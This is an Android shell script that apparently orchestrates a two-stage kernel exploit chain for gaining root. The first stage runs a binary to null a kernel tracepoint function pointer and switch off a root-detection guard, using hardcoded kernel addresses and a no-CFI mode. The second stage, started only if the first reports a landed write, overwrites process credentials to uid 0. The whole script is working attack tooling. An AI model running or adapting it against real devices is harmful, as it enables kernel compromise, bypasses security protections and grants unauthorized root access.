#!/system/bin/sh
# Two-process uid0 chain (GLM 09-01 + 09-12 PLAIN only-left cred).
# P1: leaf-NULL *__tracepoint_sys_exit.funcs=0 (ROOTGUARD off for this boot)
# P2: UID0_DIRECT first-walk cred punch, park-class only-left (not only-right)
# Do not start P2 unless P1 write_proof_LANDED. One GhostLock at a time.
set -e
cd /data/local/tmp
BIN=${BIN:-/data/local/tmp/gl_uid0}
export KPHYS=0xa8000000
export CORE_SEL=7
export MODE4_SWAP_NOCFI=1
export GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log
export GHOSTLOCK_STAGE=/sdcard/ghostlock/aarif/stage.txt
export GHOSTLOCK_PROOF=/sdcard/ghostlock/aarif/proof.log

rm -f /data/local/tmp/hkc1.txt /data/local/tmp/hkc.txt \
      /data/local/tmp/child_uid.txt /data/local/tmp/uid0_id.txt \
      /data/local/tmp/ROOTED_ID.txt

echo "CHAIN P1 leaf-NULL $(date)" | tee /data/local/tmp/hkc1.txt
MODE4_ONLY=1 MODE4_SLIDE_ZERO=1 MODE4_NULL_STORE=1 \
  SLIDE_P0_TARGET=0xffffff802a950700 DATAONLY_TARGET=0x2950700 \
  "$BIN" >> /data/local/tmp/hkc1.txt 2>&1
echo "CHAIN P1 exit=$?" >> /data/local/tmp/hkc1.txt

if ! grep -E -q "write_proof_LANDED|leaf-NULL walk lived|hook-off walk success=1" /data/local/tmp/hkc1.txt; then
  echo "CHAIN P1 MISS — not starting P2" | tee -a /data/local/tmp/hkc1.txt
  exit 2
fi

echo "CHAIN P2 UID0_DIRECT $(date)" | tee /data/local/tmp/hkc.txt
UID0_DIRECT=1 MODE4_ONLY=1 MODE4_UID0=1 \
  "$BIN" >> /data/local/tmp/hkc.txt 2>&1
echo "CHAIN P2 exit=$?" >> /data/local/tmp/hkc.txt
exit 0
